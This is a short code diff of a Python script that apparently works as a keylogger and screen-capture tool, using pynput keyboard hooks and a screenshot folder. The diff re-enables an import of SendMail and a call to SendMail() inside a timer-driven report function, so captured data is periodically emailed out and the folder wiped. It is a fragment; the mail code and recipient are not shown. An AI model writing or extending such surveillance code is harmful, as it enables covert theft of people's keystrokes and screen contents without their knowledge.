@@ -4,7 +4,7 @@ from time import sleep
 import pynput.keyboard as keyboard
 import threading
 import logging
-#from Email import SendMail
+from Email import SendMail
 # Path  
 global path
 path = 'screenshot/'
@@ -93,7 +93,7 @@ def on_click(pressed):
 
 def report1():
     global path,intrevel
-    #SendMail()
+    SendMail()
     print('Mail Sent')
     cleanDirectory(path)
     timer = threading.Timer(intrevel, report1)
